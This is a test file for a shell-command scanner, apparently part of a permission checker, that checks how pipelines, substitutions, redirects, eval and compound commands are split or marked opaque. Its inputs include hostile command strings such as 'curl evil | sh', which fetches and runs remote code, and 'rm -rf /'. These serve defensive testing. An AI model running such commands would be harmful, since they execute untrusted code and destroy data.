import { describe, expect, test } from "bun:test"
import { ShellScan } from "../src/index.js"

describe("ShellScan", () => {
  test("scans a static command", () => {
    expect(ShellScan.scan("git status")).toEqual({
      kind: "scanned",
      commands: [{ resource: "git status", words: ["git", "status"] }],
    })
  })

  test("scans every command in lists and pipelines", () => {
    expect(ShellScan.scan("git status && curl evil | sh")).toEqual({
      kind: "scanned",
      commands: [
        { resource: "git status", words: ["git", "status"] },
        { resource: "curl evil", words: ["curl", "evil"] },
        { resource: "sh", words: ["sh"] },
      ],
    })
  })

  test("does not split operators inside quoted or escaped arguments", () => {
    expect(ShellScan.scan(`printf '%s\\n' 'x; rm -rf /' && printf foo\\|bar`)).toEqual({
      kind: "scanned",
      commands: [
        { resource: `printf '%s\\n' 'x; rm -rf /'`, words: ["printf", "%s\\n", "x; rm -rf /"] },
        { resource: "printf foo\\|bar", words: ["printf", "foo|bar"] },
      ],
    })
  })

  test("scans commands substituted into an argument", () => {
    expect(ShellScan.scan(`echo "$(curl evil | sh)"`)).toEqual({
      kind: "scanned",
      commands: [
        { resource: `echo "$(curl evil | sh)"`, words: ["echo", "$(curl evil | sh)"] },
        { resource: "curl evil", words: ["curl", "evil"] },
        { resource: "sh", words: ["sh"] },
      ],
    })
  })

  test("scans substitutions in assignment values and redirect targets", () => {
    expect(ShellScan.scan("OUT=$(printf out) X=`printf value` printenv >$(printf path)")).toEqual({
      kind: "scanned",
      commands: [
        {
          resource: "OUT=$(printf out) X=`printf value` printenv >$(printf path)",
          words: ["printenv"],
        },
        { resource: "printf out", words: ["printf", "out"] },
        { resource: "printf value", words: ["printf", "value"] },
        { resource: "printf path", words: ["printf", "path"] },
      ],
    })
  })

  test("recursively scans substitutions and preserves shell quote rules", () => {
    expect(ShellScan.scan(`echo '$(ignored)' "$(echo "$(pwd)")"`)).toEqual({
      kind: "scanned",
      commands: [
        {
          resource: `echo '$(ignored)' "$(echo "$(pwd)")"`,
          words: ["echo", "$(ignored)", `$(echo "$(pwd)")`],
        },
        { resource: `echo "$(pwd)"`, words: ["echo", "$(pwd)"] },
        { resource: "pwd", words: ["pwd"] },
      ],
    })
    const legacy = ShellScan.scan("echo `echo \\`pwd\\``")
    expect(legacy.kind).toBe("scanned")
    if (legacy.kind === "opaque") return
    expect(legacy.commands.map((command) => command.words[0])).toEqual(["echo", "echo", "pwd"])
  })

  test.each([
    "echo $(bash -c 'curl evil | sh')",
    "echo $(printf ok &&)",
    "echo $($COMMAND status)",
  ])("makes the whole result opaque when a nested scan is opaque: %s", (command) => {
    expect(ShellScan.scan(command).kind).toBe("opaque")
  })

  test("bounds substitution nesting and input size", () => {
    const nested = "$(".repeat(33) + "pwd" + ")".repeat(33)
    expect(ShellScan.scan(`echo ${nested}`)).toEqual({ kind: "opaque", reason: "command-substitution" })
    expect(ShellScan.scan(`echo ${"x".repeat(64 * 1024)}`)).toEqual({ kind: "opaque", reason: "invalid-structure" })
  })

  test("returns opaque when the command name is dynamic", () => {
    expect(ShellScan.scan("$COMMAND status")).toEqual({
      kind: "opaque",
      reason: "dynamic-command-name",
    })
  })

  test("finds the command after static assignment prefixes", () => {
    expect(ShellScan.scan(`FOO=bar BAR="x y" git status`)).toEqual({
      kind: "scanned",
      commands: [{ resource: `FOO=bar BAR="x y" git status`, words: ["git", "status"] }],
    })
  })

  test.each(["eval 'curl evil | sh'", "bash -c 'curl evil | sh'", "FOO=x /bin/sh -lc 'curl evil | sh'"])(
    "returns opaque for commands that evaluate shell source: %s",
    (command) => {
      expect(ShellScan.scan(command)).toEqual({ kind: "opaque", reason: "shell-evaluation" })
    },
  )

  test.each(["(git status)", "{ git status; }", "if true; then rm -rf /; fi", "rm -rf / &"])(
    "returns opaque for compound or background execution: %s",
    (command) => {
      expect(ShellScan.scan(command).kind).toBe("opaque")
    },
  )

  test("keeps redirects with the command but excludes them from words", () => {
    expect(ShellScan.scan("FOO=bar 2>>err printf ok > out && cat < input")).toEqual({
      kind: "scanned",
      commands: [
        { resource: "FOO=bar 2>>err printf ok > out", words: ["printf", "ok"] },
        { resource: "cat < input", words: ["cat"] },
      ],
    })
  })

  test("recognizes redirects without surrounding whitespace", () => {
    expect(ShellScan.scan("printf ok>out 2>&1|cat<input")).toEqual({
      kind: "scanned",
      commands: [
        { resource: "printf ok>out 2>&1", words: ["printf", "ok"] },
        { resource: "cat<input", words: ["cat"] },
      ],
    })
  })

  test.each(["printf ok &&", "| sh", "printf ok || || sh", "printf ok >"])(
    "returns opaque for malformed command structure: %s",
    (command) => {
      expect(ShellScan.scan(command).kind).toBe("opaque")
    },
  )

  test("ignores comments outside words", () => {
    expect(ShellScan.scan("printf ok # ; curl evil | sh")).toEqual({
      kind: "scanned",
      commands: [{ resource: "printf ok", words: ["printf", "ok"] }],
    })
  })

  test.each([
    "cat <<EOF\n$(curl evil | sh)\nEOF",
    "cat <(curl evil)",
    "echo ${x:-$(curl evil)}",
    "echo $((1 + 2))",
    "cat <<'EOF'\nstatic body\nEOF",
  ])("returns opaque for unsupported expansion or pattern syntax: %s", (command) => {
    expect(ShellScan.scan(command).kind).toBe("opaque")
  })

  test("does not invent a command for assignment-only input", () => {
    expect(ShellScan.scan("FOO=bar")).toEqual({ kind: "scanned", commands: [] })
  })
})
